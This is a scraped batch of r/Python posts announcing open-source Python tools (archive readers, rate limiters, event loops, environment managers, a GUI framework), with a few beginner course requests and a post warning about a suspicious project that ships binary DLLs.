- Scalability if needed

I'd really appreciate hearing about your experiences or any recommendations for modern tools or stacks that work well for this kind of project.

Thanks I appreciate it!
"
1mcrj71,"Training a ""Tab Tab"" Code Completion Model for Marimo Notebooks",FallMindless3563,8,0,2025-07-29 23:52:15,https://www.reddit.com/r/Python/comments/1mcrj71/training_a_tab_tab_code_completion_model_for/,"In the spirit of building in public, we're collaborating with [Marimo](https://marimo.io/) to build a **""tab completion"" model** for their notebook cells, and we wanted to share our progress as we go in tutorial form.

The goal is to create a local, open-source model that provides a *Cursor-like* code-completion experience directly in notebook cells. You'll be able to download the weights and run it locally with **Ollama** or access it through a free API we provide.

We‚Äôre already seeing promising results by fine-tuning the **Qwen** and **Llama** models, but there‚Äôs still more work to do.

üëâ Here‚Äôs the first post in what will be a series:  
[https://www.oxen.ai/blog/building-a-tab-tab-code-completion-model](https://www.oxen.ai/blog/building-a-tab-tab-code-completion-model)

If you‚Äôre interested in contributing to data collection or the project in general, let us know! We already have a working **CodeMirror plugin** and are focused on improving the model‚Äôs accuracy over the coming weeks."
1mcrerl,"Archivey -  unified interface for ZIP, TAR, RAR, 7z and more",parafusosaltitante,39,9,2025-07-29 23:46:48,https://www.reddit.com/r/Python/comments/1mcrerl/archivey_unified_interface_for_zip_tar_rar_7z_and/,"Hi! I've been working on [this project](https://github.com/davitf/archivey) ([PyPI](https://pypi.org/project/archivey)) for the past couple of months, and I feel it's time to share and get some feedback.

# Motivation

While building a tool to organize my backups, I noticed I had to write separate code for each archive type, as each of the format-specific libraries (`zipfile`, `tarfile`, `rarfile`, `py7zr`, etc) has slightly different APIs and quirks.

I couldn‚Äôt find a unified, Pythonic library that handled all common formats with the features I needed, so I decided to build one. I figured others might find it useful too.

# What my project does

It provides a simple interface for reading and extracting many archive formats with consistent behavior:

    from archivey import open_archive
    
    with open_archive(""example.zip"") as archive:
        archive.extractall(""output_dir/"")
    
        # Or process each file in the archive without extracting to disk
        for member, stream in archive.iter_members_with_streams():
            print(member.filename, member.type, member.file_size)
            if stream is not None:  # it's None for dirs and symlinks
                # Print first 50 bytes
                print(""  "", stream.read(50))

But it's not just a wrapper; behind the scenes, it handles a lot of special cases, for example:

* The standard `zipfile` module doesn‚Äôt handle symlinks directly; they have to be reconstructed from the member flags and the targets read from the data.
* The `rarfile` API only supports per-file access, which causes unnecessary decompressions when reading solid archives. Archivey can use `unrar` directly to read all members in a single pass.
* `py7zr` doesn‚Äôt expose a streaming API, so the library has an internal stream wrapper that integrates with its extraction logic.
* All backend-specific exceptions are wrapped into a unified exception hierarchy.

My goal is to hide all the format-specific gotchas and provide a safe, standard-library-style interface with consistent behavior.

(I know writing support would be useful too, but I‚Äôve kept the scope to reading for now as I'd like to get it right first.)

# Feedback and contributions welcome

If you:

* have archive files that don't behave correctly (especially if you get an exception that's not wrapped)
* have a use case this API doesn't cover
* care about portability, safety, or efficient streaming

I‚Äôd love your feedback. Feel free to reply here, open an issue, or send a PR. Thanks!"
1mcocw9,Python - Looking for a solid online course (I have basic HTML/CSS/JS knowledge),Mobile_Pace_5384,0,5,2025-07-29 21:37:35,https://www.reddit.com/r/Python/comments/1mcocw9/python_looking_for_a_solid_online_course_i_have/,"Hi everyone, I'm just getting started with Python and would really appreciate some course recommendations.
A bit about me: I'm fairly new to programming, but l do have some basic knowledge on HTML, CSS, and a bit of JavaScript. Now I'm looking to dive into Python and eventually use it for things like data analysis, automation, and maybe even Al/machine learning down the line.
I'm looking for an online course that is beginner-friendly, well-structured, and ideally includes hands-on projects or real-world examples. I've seen so many options out there (Udemy, Coursera, edX, etc.), it's a bit overwhelming-so l'd love to hear what worked for you or what you'd recommend for someone starting out.
Thanks in advance!
Python

 #LearnPython #ProgrammingHelp #BeginnerCoding #OnlineCourses
#SelfTaughtDeveloper
#DataAnalysis #Automation #Al"
1mco5mk,throttlekit ‚Äì A Simple Async Rate Limiter for Python,roudra,7,0,2025-07-29 21:29:41,https://www.reddit.com/r/Python/comments/1mco5mk/throttlekit_a_simple_async_rate_limiter_for_python/,"I was looking for a simple, efficient way to rate limit async requests in Python, so I built [throttlekit](https://github.com/rowds/throttlekit), a lightweight library for just that!

# What My Project Does:

* **Two Rate Limiting Algorithms:**
   * **Token Bucket:** Allows bursts of requests with a refillable token pool.
   * **Leaky Bucket:** Ensures a steady request rate, processing tasks at a fixed pace.
* **Concurrency Control:** The `TokenBucketRateLimiter` allows you to limit the number of concurrent tasks using a semaphore, which is a feature not available in many other rate limiting libraries.
* **Built for Async:** It integrates seamlessly with Python‚Äôs `asyncio` to help you manage rate-limited async requests in a non-blocking way.
* **Flexible Usage Patterns:** Supports decorators, context managers, and manual control to fit different needs.

# Target Audience:

This is perfect for **async applications** that need rate limiting, such as:

* **Web Scraping**
* **API Client Integrations**
* **Background Jobs**
* **Queue Management**

It‚Äôs lightweight enough for small projects but powerful enough for production applications.

# Comparison:

* I created **throttlekit** because I needed a simple, efficient async rate limiter for Python that integrated easily with `asyncio`.
* Unlike other libraries like `aiolimiter` or `async-ratelimit`, **throttlekit** stands out by offering **semaphore-based concurrency control** with the `TokenBucketRateLimiter`. This ensures that you can limit concurrent tasks while handling rate limiting, which is not a feature in many other libraries.

# Features:

* **Token Bucket:** Handles burst traffic with a refillable token pool.
* **Leaky Bucket:** Provides a steady rate of requests (FIFO processing).
* **Concurrency Control:** Semaphore support in the `TokenBucketRateLimiter` for limiting concurrent tasks.
* **High Performance:** Low-overhead design optimized for async workloads.
* **Easy Integration:** Works seamlessly with `asyncio.gather()` and `TaskGroup`.

# Relevant Links:

* https://github.com/rowds/throttlekit
* https://pypi.org/project/throttlekit

If you're dealing with rate-limited async tasks, check it out and let me know your thoughts! Feel free to ask questions or contribute!"
1mcnjtz,What name do you prefer when importing pyspark.sql.functions?,rghthndsd,19,24,2025-07-29 21:05:45,https://www.reddit.com/r/Python/comments/1mcnjtz/what_name_do_you_prefer_when_importing/,"You should import pyspark.sql.functions as psf. Change my mind!

 - pyspark.sql.functions abbreviates to psf 
 - In my head, I say ""py-spark-functions"" which abbreviates to psf.
 - One letter imports are a tool of the devil!
 - It also leads to natural importing of pyspark.sql.window and pyspark.sql.types as psw and pst."
1mcmfhp,"Tutorial Recommendation: Building an MCP Server in Python, full stack (auth, databases, etc...)",SemiOfficialEng,15,0,2025-07-29 20:23:04,https://www.reddit.com/r/Python/comments/1mcmfhp/tutorial_recommendation_building_an_mcp_server_in/,"*Let's lead with a disclaimer: this tutorial uses Stytch, and I work there. That being said, I'm not Tim, so don't feel too much of a conflict here :)*

[This video](https://youtu.be/j5f2EQf5hkw?si=cXj6GJDSUN1dYFoU)¬†is a great resource for some of the missing topics around how to actually go about building MCP servers - what goes into a full stack Python app for MCP servers. (... I pinky swear that that link isn't a RickRoll üòÇ)

I'm sharing this because, as MCP servers are hot these days I've been talking with a number of people at conferences and meetups about how they're approaching this new gold rush, and more often than not there are tons of questions about how to actually do the¬†*implementation work*¬†of an MCP server. Often people jump to one of the SaaS companies to build out their server, thinking that they provide a lot of boilerplate to make the building process easier. Other folks think that you must use Node+React/Next because a lot of the getting started content uses these frameworks. There seems to be a lot of confusion with how to go about building an app and people seem to be looking for some sort of guide.

It's absolutely possible to build a Python app that operates as an MCP server and so I'm glad to see this sort of content out in the world. The ""P"" is just Protocol, after all, and any programming language that can follow this protocol can be an MCP server. This walkthrough goes even further to consider stuff in the best practices / all the batteries included stuff like auth, database management, and so on, so it gets extra props from me. As a person who prefers Python I feel like I'd like to spread the word!

This video does a great job of showing how to do this, and as I'd love for more takes on building with Python to help MCP servers proliferate - and to see lots of cool things done with them - I thought I'd share this out to get your takes."
1mck8h3,tinyio: A tiny (~200 lines) event loop for Python,ogMasterPloKoon,55,7,2025-07-29 19:00:30,https://www.reddit.com/r/Python/comments/1mck8h3/tinyio_a_tiny_200_lines_event_loop_for_python/,"*Ever used*¬†`asyncio`¬†*and wished you hadn't?*

`tinyio`¬†is a dead-simple event loop for Python, born out of my frustration with trying to get robust error handling with¬†`asyncio`. ( not the only one running into its sharp corners:¬†[link1](https://sailor.li/asyncio),¬†[link2](https://lucumr.pocoo.org/2016/10/30/i-dont-understand-asyncio/).)

This is an alternative for the simple use-cases, where you just need an event loop, and want to crash the whole thing if anything goes wrong. (Raising an exception in every coroutine so it can clean up its resources.)

  
[https://github.com/patrick-kidger/tinyio](https://github.com/patrick-kidger/tinyio)"
1mcjr34,Copyparty - local content sharing / FTP/SFTP/SMB etc,vectorx25,27,3,2025-07-29 18:42:30,https://www.reddit.com/r/Python/comments/1mcjr34/copyparty_local_content_sharing_ftpsftpsmb_etc/,"ran into this lib while browsing github trending list, absolutely wild project

tons of features, sFTP, TFTP, SMB, media share, on-demand codecs, ACLs - but I love how crazy simple it is to run

tested it sharing my local photo storage on an external 2TB WD hard drive,

pip3 install copyparty  
copyparty -v /mnt/wd/photos:MyPhotos:r (starts the app on [127.0.0.1:3923](http://127.0.0.1:3923), gives users read-only access to your files)

dnf install cloudflared (get the RPM from cloudflare downloads)

\# share the photos via generated URL  
cloudflared tunnel --url [http://127.0.0.1:3923](http://127.0.0.1:3923)

send your family the URL generated from above step, done.

Speed of photo/video/media loading is phenomenal (not sure if due to copyparty or cloudflare).

the developer has a great youtube video showing all the features.

[https://youtu.be/15\_-hgsX2V0?si=9LMeKsj0aMlztwB8](https://youtu.be/15_-hgsX2V0?si=9LMeKsj0aMlztwB8)

project reminds me of Updog, but with waaay more features and easier cli tooling. Just truly useful tool that I see myself using daily.

check it out

[https://github.com/9001/copyparty](https://github.com/9001/copyparty)"
1mcjag3,BlockDL - Visual neural network builder with instant Python code generation and shape checking,Aryagm,3,0,2025-07-29 18:25:12,https://www.reddit.com/r/Python/comments/1mcjag3/blockdl_visual_neural_network_builder_with/,"# Motivation

Designing neural network architectures is inherently a visual process. Every time I train a new model, I find myself sketching it out on paper before translating it into Python (and still running into shape mismatches no matter how many networks I've built).

# What My Project Does

So I built BlockDL:

* Easy drag and drop functionality
* It generates working Keras code instantly as you build (hoping to add PyTorch if this gets traction).
* You get live shape validation (catch mismatched layer shapes early)
* It supports advanced structures like skip connections and multi-input/output models
* It also includes a full learning system with 5 courses and multiple interactive lessons and challenges.

BlockDL is **free and open-source**, and donations help with my college tuition.

# Comparison

Although there are tools drag and drop tool slike [Fabric](https://github.com/Cloud-CV/Fabrik), they are clunky, have complex setups, and don't offer instant code generation.  I tried to make BlockDL as intuitive and easy to use as possible. Like a sketchpad for designing creative networks and getting the code instantly to test out.

# Target Audience:

DL enthusiasts who want a more visual and seamless way of designing creative network architectures and don't want to fiddle with the code or shape mismatches.

# Links

Try it out: [https://blockdl.com](https://blockdl.com)

GitHub (core engine): [https://github.com/aryagm/blockdl](https://github.com/aryagm/blockdl)  


note: I know this was not built using Python, but I think for the large number of Python devs working on Machine Learning this would be an useful project because of the python code generation. Let me know if this is out-of-scope, and I'll take it down promptly. thanks :)"
1mchd1i,Swanky Python: Jupyter Notebook/Smalltalk/Lisp inspired interactive development,sc_zi,3,0,2025-07-29 17:14:48,https://www.reddit.com/r/Python/comments/1mchd1i/swanky_python_jupyter_notebooksmalltalklisp/,"**Motivation**

Many enjoy the fast feedback loop provided by notebooks. We can develop our code piece by piece, immediately seeing the results of the code we added or modified, without having to rerun everything and wait on it to reperform potentially expensive calculations or web requests. Unfortunately notebooks are only really suitable for what could be written as single file scripts, they can't be used for general purpose software development.

When writing web backends, we also have a fast feedback loop. All state is external in a database, so we can have a file watcher that just restarts the whole python process on any change, and immediately see the effects of our change.

However with other kinds of application development, the feedback loop can be much slower. We have to restart our application and recreate the same internal state just to see the effect of each change we make. Common Lisp and Smalltalk addressed this by allowing you do develop inside a running process without restarting it. You can make small changes to your code and immediately see their effect, along with providing tools that aid in development by introspecting on the current state of your process.

**What My Project Does**

I'm trying to bring Smalltalk and Common Lisp inspired interactive development to Python. In the [readme](https://codeberg.org/sczi/swanky-python) I included a bunch of short 20-60 second videos showing the main features so far. It's a lot easier to show than to try to describe.

**Target Audience**

* Any python users interested in a faster feedback loop during development, or who think the introspection and debugging tools provided look interesting
* Emacs users
* Common Lisp or Smalltalk developers who want a development experience closer to that when they work with Python

Warning: This is a very new project. I am using it for all my own python development since a few months ago, and it's working stable enough for me. Though I do run into bugs, just as I know the software I can generally immediately fix it without having to restart, that's the magic it provides :)

I just wrote a readme and published the project yesterday, afaik there are no other users yet. So you will probably run into bugs using it or even just trying to get it installed, but don't hesitate to message me and I'll try and help out.

Code and video demonstrations: https://codeberg.org/sczi/swanky-python

Automoderator removes posts without a link to github or gitlab, and I'm hosting this project on codeberg... so here's a github link to the development environment for Common Lisp that this is built on top of: https://github.com/slime/slime"
1mcgwgp,program to convert text to MIDI,KitAndKat,5,2,2025-07-29 16:58:26,https://www.reddit.com/r/Python/comments/1mcgwgp/program_to_convert_text_to_midi/,"I've just released [Midi Maker](https://github.com/philmayes/midi_maker). Feedback snd suggestions very welcome.

** What My Project Does **

`midi_maker` interprets a text file (by convention using a .ini extension) and generates a midi file from it with the same filename in the same directory.

** Target Audience **

Musicians, especially composers.

** Comparison **

vishnubob/python-midi and YatingMusic/miditoolkit construct a MIDI file on a per-event level.
Rainbow-Dreamer/musicpy is closer, but its syntax does not appeal to me. I believe that midi_maker is closer to the way the average musician thinks about music.

### Dependencies
It uses [MIDIUtil](https://midiutil.readthedocs.io/) to create a MIDI file and [FluidSynth](https://www.fluidsynth.org/) if you want to listen to the generated file.
### Syntax
The text file syntax is a list of commands with the format: `command param1=value1 param2=value2,value3...`.
For example:

    ; Definitions
    voice  name=perc1 style=perc   voice=high_mid_tom
    voice  name=rick  style=rhythm voice=acoustic_grand_piano
    voice  name=dave  style=lead   voice=cello
    rhythm name=perc1a durations=h,e,e,q
    tune   name=tune1 notes=q,G,A,B,hC@6,h.C,qC,G@5,A,hB,h.B
    ; Performance
    rhythm voices=perc1 rhythms=perc1a ; play high_mid_tom with rhythm perc1a
    play   voice=dave tunes=tune1      ; play tune1 on cello
    bar    chords=C
    bar    chords=Am
    bar    chords=D7
    bar    chords=G

Full details in the [docs](https://github.com/philmayes/midi_maker/blob/main/DOCS.md) file.

### Examples
There are examples of input files in the `data/` directory."
1mcgsxr,UV is helping me slowly get rid of bad practices and improve company‚Äôs internal tooling.,bunoso,443,112,2025-07-29 16:54:45,https://www.reddit.com/r/Python/comments/1mcgsxr/uv_is_helping_me_slowly_get_rid_of_bad_practices/,"I work at a large conglomerate company that has been around for a long time. One of the most annoying things that I‚Äôve seen is certain Engineers will put their python scripts into box or into artifactory as a way of deploying or sharing their code as internal tooling. One example might be, ‚Äúhere‚Äôs this python script that acts as a AI agent, and you can use it in your local setup. Download the script from box and set it up where needed‚Äù.

I‚Äôm sick of this. First of all, no one just uses .netrc files to share their actual Gitlab repository code. Also every sets their Gitlab projects to private.

Well I‚Äôve finally been on the tech crusade to say, 1) just use Gitlab, 2 use well known authentication methods like netrc with a Gitlab personal access token, and 3) use UV! Stop with the random requirements.txt files scattered about.

I now have a few well used cli internal tools that are just as simple as installing UV, setting up the netrc file on the machine, then running uvx git+https://gitlab.com/acme/my-tool some args -v.

Its has saved so much headache. We tried poetry but now I‚Äôm full in on getting UV spread across the company!

Edit:

I‚Äôve seen artifactory used simply as a object storage. It‚Äôs not used in the way suggested below as a private pypi repo. "
1mcfisa,"Gooey, but with an html frontend",MonsieurCellophane,4,2,2025-07-29 16:07:28,https://www.reddit.com/r/Python/comments/1mcfisa/gooey_but_with_an_html_frontend/,"I am looking for the equivalent of gooey (https://pypi.org/project/Gooey/) that will run in a web browser.

Gooey wraps CLI programs that use argparse in a simple (WxPython) GUI: I was wondering if there is a similar tool that generates a web oriented interface, useable in a browser (it should probably implement a webserver for that).

I have not (yet) looked at gooey's innards - It may well be that piggybacking something of the sort on it is not very difficult.
"
1mc7b5v,Just joined a free Santander course that teaches Python,LA_72,0,4,2025-07-29 09:56:25,https://www.reddit.com/r/Python/comments/1mc7b5v/just_joined_a_free_santander_course_that_teaches/,"Has anyone used this and if so how are you getting along with it? It has already taught me a bit of problem solving due to the Jupyter notebook program not working but the Stack Overflow website helped me with this.
I‚Äôm a 52 year old dad who wants a skill under his belt and my goal is to write my own app and the closest I‚Äôve ever been to code is ‚Äò10 print, 20 go to 10, run on the Commodore 64!"
1mc75ri,python-hiccup: HTML with plain Python data structures,david-vujic,7,4,2025-07-29 09:46:28,https://www.reddit.com/r/Python/comments/1mc75ri/pythonhiccup_html_with_plain_python_data/,"Project name: python-hiccup

# What My Project Does

This is a library for representing HTML in Python. Using list or tuple to represent HTML elements, and dict to represent the element attributes. You can use it for server side rendering of HTML, as a programmatic pure Python alternative to templating, or with PyScript.

**Example**

    from python_hiccup.html import render
    
    data = [""div"", ""Hello world!""]
    render(data)

The output:

    <div>Hello world!</div>


**Syntax**

The first item in the Python list is the element. The rest is attributes, inner text or children. You can define nested structures or siblings by adding lists (or tuples if you prefer).

Adding a nested structure:

    [""div"", [""span"", [""strong"", ""Hello world!""]]]

The output:

    <div>  
        <span>  
            <strong>Hello world!</strong>  
        </span>  
    </div>


# Target Audience

Python developers writing server side rendered UIs or browser-based Python with PyScript.

# Comparison

I have found existing implementations of Hiccup for Python, but doesn‚Äôt seem to have been maintained in many years: pyhiccup and hiccup.

# Links

Repo: [https://github.com/DavidVujic/python-hiccup](https://github.com/DavidVujic/python-hiccup) 

  
‚Å†A short Article, introducing python-hiccup: [https://davidvujic.blogspot.com/2024/12/introducing-python-hiccup.html](https://davidvujic.blogspot.com/2024/12/introducing-python-hiccup.html)"
1mc3co4,notata: Simple structured logging for scientific simulations,electric-nature,30,2,2025-07-29 05:40:45,https://www.reddit.com/r/Python/comments/1mc3co4/notata_simple_structured_logging_for_scientific/,"**What My Project Does:**

`notata` is a small Python library for logging simulation runs in a consistent, structured way. It creates a new folder for each run, where it saves parameters, arrays, plots, logs, and metadata as plain files.

The idea is to stop rewriting the same I/O code in every project and to bring some consistency to file management, without adding any complexity. No config files, no database, no hidden state. Everything is just saved where you can see it.

**Target Audience:**

This is for scientists and engineers who run simulations, parameter sweeps, or numerical experiments. If you‚Äôve ever manually saved arrays to .npy, dumped params to a JSON file, and ended up with a folder full of half-labeled outputs, this could be useful to you.

**Comparison:**

Unlike tools like MLflow or W&B, `notata` doesn‚Äôt assume you‚Äôre doing machine learning. There‚Äôs no dashboard, no backend server, and nothing to configure. It just writes structured outputs to disk. You can grep it, copy it, or archive it.

More importantly, it‚Äôs a way to standardize simulation logging without changing how you work or adding too much overhead.


**Source Code:**
[https://github.com/alonfnt/notata](https://github.com/alonfnt/notata)


**Example**: Damped Oscillator Simulation

This logs a full run of a basic physics simulation, saving the trajectory and final state


```python
from notata import Logbook
import numpy as np

omega = 2.0
dt = 1e-3
steps = 5000

with Logbook(""oscillator_dt1e-3"", params={""omega"": omega, ""dt"": dt, ""steps"": steps}) as log:
    x, v = 1.0, 0.0
    xs = []
    for n in range(steps):
        a = -omega**2 * x
        x += v * dt + 0.5 * a * dt**2
        a_new = -omega**2 * x
        v += 0.5 * (a + a_new) * dt
        xs.append(x)

    log.array(""x_values"", np.array(xs))
    log.json(""final_state"", {""x"": float(x), ""v"": float(v)
```

This creates a folder like:

```
outputs/log_oscillator_dt1e-3/
‚îú‚îÄ‚îÄ data/
‚îÇ   ‚îî‚îÄ‚îÄ x_values.npy
‚îú‚îÄ‚îÄ artifacts/
‚îÇ   ‚îî‚îÄ‚îÄ final_state.json
‚îú‚îÄ‚îÄ params.yaml
‚îú‚îÄ‚îÄ metadata.json
‚îî‚îÄ‚îÄ log.txt
```

Which can be explored manually or using a reader:

```python
from notata import LogReader
reader = LogReader(""outputs/log_oscillator_dt1e-3"")
print(reader.params[""omega""])
trajectory = reader.load_array(""x_values"")
```

**Importantly!** This isn‚Äôt meant to be flashy, just structured simulation logging with (hopefully) minimal overhead. 

If you read this far and you would like to contribute, you are more than welcome to do so! I am sure there are many ways to improve it. I also think that only by using it we can define the forward path of `notata`.

"
1mbwnvx,Run Python scripts on the cloud with uv and Coiled,dask-jeeves,39,1,2025-07-29 00:04:03,https://www.reddit.com/r/Python/comments/1mbwnvx/run_python_scripts_on_the_cloud_with_uv_and_coiled/,"It's been fun to see all the uv examples lately on this sub, so thought I'd share another one.

For those who aren't familiar, uv is a fast, easy to use package manager for Python. But it's a lot more than a pip replacement. Because uv can interpret PEP 723 metadata, it behaves kind of like npm, where you have self-contained, runnable scripts. This combines nicely with Coiled, a UX-focused cloud compute platform. You can declare script-specific dependencies with `uv add --script` and specify runtime config with inline `# COILED` comments.

Your script might end up looking something like:

    # COILED container ghcr.io/astral-sh/uv:debian-slim
    # COILED region us-east-2
    
    # /// script
    # requires-python = "">=3.12""
    # dependencies = [
    #   ""pandas"",
    #   ""pyarrow"",
    #   ""s3fs"",
    # ]
    # ///

And you can run that script on the cloud with:

    uvx coiled batch run \
        uv run my-script.py

Compare that to something like AWS Lambda or AWS Batch, where you‚Äôd typically need to:

* Package your script and dependencies into a ZIP file or build a Docker image
* Configure IAM roles, triggers, and permissions
* Handle versioning, logging, or hardware constraints

Here's the full video walkthrough: [https://www.youtube.com/watch?v=0qeH132K4Go](https://www.youtube.com/watch?v=0qeH132K4Go)"
1mbwkux,Tuesday Daily Thread: Advanced questions,AutoModerator,4,0,2025-07-29 00:00:29,https://www.reddit.com/r/Python/comments/1mbwkux/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1mbopcc,Be careful on suspicious projects like this,sausix,652,73,2025-07-28 18:47:33,https://www.reddit.com/r/Python/comments/1mbopcc/be_careful_on_suspicious_projects_like_this/,"[https://imgur.com/a/YOR8H5e](https://imgur.com/a/YOR8H5e)

Be careful installing or testing random stuff from the Internet. It's not only typesquatting on PyPI and supply chain atacks today.  
This project has a lot of suspicious actions taken:

* Providing binary blobs on github. NoGo!
* Telling you something like you can check the DLL files before using. AV software can't always detect freshly created malicious executables.
* Announcing a CPP project like it's made in Python itself. But has only a wrapper layer.
* Announcing benchmarks which look too fantastic.
* Deleting and editing his comments on reddit.
* Insults during discussions in the comments.
* Obvious AI usage. Emojis everywhere! Coincidently learned programming since Chat-GPT exists.
* Doing noobish mistakes in Python code a CPP programmer should be aware of. Like printing errors to STDOUT.

  
I haven't checked the DLL files. The project may be harmless. This warning still applies to suspicious projects. Take care!"
1mbj5ph,"I've created a lightweight tool called ""venv-stack"" to make it easier to deal with PEP 668",FlameOfIgnis,16,44,2025-07-28 15:24:10,https://www.reddit.com/r/Python/comments/1mbj5ph/ive_created_a_lightweight_tool_called_venvstack/,"Hey folks,

I just released a small tool called venv-stack that helps manage Python virtual environments in a more modular and disk-efficient way (without duplicating libraries), especially in the context of PEP 668, where messing with system or user-wide packages is discouraged.

[https://github.com/ignis-sec/venv-stack](https://github.com/ignis-sec/venv-stack)

[https://pypi.org/project/venv-stack/](https://pypi.org/project/venv-stack/)

# Problem

* PEP 668 makes it hard to install packages globally or system-wide-- you‚Äôre encouraged to use virtualenvs for everything.
* But heavy packages (like torch, opencv, etc.) get installed into every single project, wasting time and tons of disk space. I realize that pip caches the downloaded wheels which helps a little, but it is still annoying to have gb's of virtual environments for every project that uses these large dependencies.
* So, your options often boil down to:
   * Ignoring PEP 668 all-together and using --break-system-packages for everything
   * Have a node\_modules-esque problem with python.

# What My Project Does

Here is how layered virtual environments work instead:

1. You create a set of base virtual environments which get placed in \~/.venv-stack/
2. For example, you can have a virtual environment with your ML dependencies (torch, opencv, etc) and a virtual environment with all the rest of your non-system packages. You can create these base layers like this: `venv-stack base ml`, or `venv-stack base some-other-environment`
3. You can activate your base virtual environments with a name: `venv-stack activate base` and install the required dependencies. To deactivate, `exit` does the trick.
4. When creating a virtual-environment for a project, you can provide a list of these base environments to be linked to the project environment. Such as `venv-stack project . ml,some-other-environment`
5. You can activate it old-school like `source ./bin/scripts/activate` or just use `venv-stack activate`. If no project name is given for the activate command, it activates the project in the current directory instead.

The idea behind it is that we can create project level virtual environments with symlinks enabled: `venv.create(venv_path, with_pip=True, symlinks=True)` And we can monkey-patch the pth files on the project virtual environments to list site-packages from all the base environments we are initiating from.

This helps you stay PEP 668-compliant **without duplicating large libraries**, and gives you a clean way to manage stackable dependency layers.

Currently it only works on Linux. The activate command is a bit wonky and depends on the shell you are using. I only implemented and tested it with bash and zsh. If you are using a differnt terminal, it is fairly easy add the definitions and contributions are welcome!

# Target Audience

`venv-stack` is aimed at:

* Python developers who work on multiple projects that share large dependencies (e.g., PyTorch, OpenCV, Selenium, etc.)
* Users on Debian-based distros where PEP 668 makes it painful to install packages outside of a virtual environment
* Developers who want a modular and space-efficient way to manage environments
* Anyone tired of re-installing the same 1GB of packages across multiple .venv/ folders

It‚Äôs production-usable, but it‚Äôs still a small tool. It‚Äôs great for:

* Individual developers
* Researchers and ML practitioners
* Power users maintaining many scripts and CLI tools

# Comparison

|Tool|Focus|How `venv-stack` is different|
|:-|:-|:-|
|`virtualenv`|Create isolated environments|`venv-stack` creates layered environments by **linking multiple base envs** into a project venv|
|`venv` (stdlib)|Default for environment creation|`venv-stack` builds on top of `venv`, adding **composition**, reuse, and convenience|
|`pyenv`|Manage Python versions|`venv-stack` doesn‚Äôt manage versions, it builds **modular dependencies** on top of your chosen Python install|
|`conda`|Full package/environment manager|`venv-stack` is lighter, uses native tools, and focuses on **Python-only dependency layering**|
|`tox`, `poetry`|Project-based workflows, packaging|`venv-stack` is **agnostic** to your workflow, it focuses only on the environment reuse problem|"
1mbe67q,uvify: Turn any python repository to environment (oneliner) using uv python manager,cov_id19,97,9,2025-07-28 11:56:29,https://www.reddit.com/r/Python/comments/1mbe67q/uvify_turn_any_python_repository_to_environment/,"Code:¬†[https://github.com/avilum/uvify](https://github.com/avilum/uvify)

\*\* What my project does \*\*

uvify generates oneliners and dependencies list quickly, based on local dir / github repo.  
It helps getting started with 'uv' quickly even if the maintainers did not use 'uv' python manager.

uv is the fastest pythom manager as of today.

* Helps with migration to¬†`uv`¬†for faster builds in CI/CD
* It works on existing projects based on:¬†`requirements.txt`,¬†`pyproject.toml`¬†or¬†[`setup.py`](http://setup.py/), recursively.
   * Supports local directories.
   * Supports GitHub links using¬†[Git Ingest](https://gitingest.com/).
* It's fast!

You can even run uvify with uv.  
Let's generate oneliners for a virtual environment that has¬†`requests`¬†installed, using PyPi or from source:

    # Run on a local directory with python project
    uvx uvify . | jq
    
    # Run on requests source code from github
    uvx uvify https://github.com/psf/requests | jq
    # or:
    # uvx uvify psf/requests | jq
    
    [
      ...
      {
        ""file"": ""setup.py"",
        ""fileType"": ""setup.py"",
        ""oneLiner"": ""uv run --python '>=3.8.10' --with 'certifi>=2017.4.17,charset_normalizer>=2,<4,idna>=2.5,<4,urllib3>=1.21.1,<3,requests' python -c 'import requests; print(requests)'"",
        ""uvInstallFromSource"": ""uv run --with 'git+https://github.com/psf/requests' --python '>=3.8.10' python"",
        ""dependencies"": [
          ""certifi>=2017.4.17"",
          ""charset_normalizer>=2,<4"",
          ""idna>=2.5,<4"",
          ""urllib3>=1.21.1,<3""
        ],
        ""packageName"": ""requests"",
        ""pythonVersion"": "">=3.8"",
        ""isLocal"": false
      }
    ]

\*\* Who it is for? \*\*

Uvify is for every pythonistas, beginners and advanced.  
It simply helps migrating old projects to 'uv' and help bootstrapping python environments for repositories without diving into the code.

I developed it for security research of open source projects, to quickly create python environments with the required dependencies, don't care how the code is being built (setup.py, pyproject.toml, requirements.txt) and don't rely on the maintainers to know 'uv'.

\*\* update \*\*  
\- I have deployed uvify to HuggingFace Spaces so you can use it with a browser:  
[https://huggingface.co/spaces/avilum/uvify](https://huggingface.co/spaces/avilum/uvify)"
1mbcs0a,"A Python GUI Framework with Graphs, Animations, Theming, State Binding & Hot Reload built on PySide6",step-czxn,0,4,2025-07-28 10:40:58,https://www.reddit.com/r/Python/comments/1mbcs0a/a_python_gui_framework_with_graphs_animations/,"**GitHub Repo:** [**Here**](http://github.com/mebaadwaheed/winup)

**What my project does:**  
WinUp is a nice, modern GUI Framework mostly for desktop but with web tooling aswell, it uses PySide6 to build UIs declaratively and drop the verbosity of PySide. It also gives you stylish Graphs, Theming, Basic Animations, Camera, State, Routing and Hot Reload too.

**Target Audience:**  
\- People who want to build Web or Desktop Apps and Dashboards  
\- Indie Devs or people who wanna try something new  
\- People who want React or Flutter style app building in Python  
No QML, XML, etc

**Comparison:**  
\- Better than TKinter although not as mature  
\- Builds ontop of PySide  
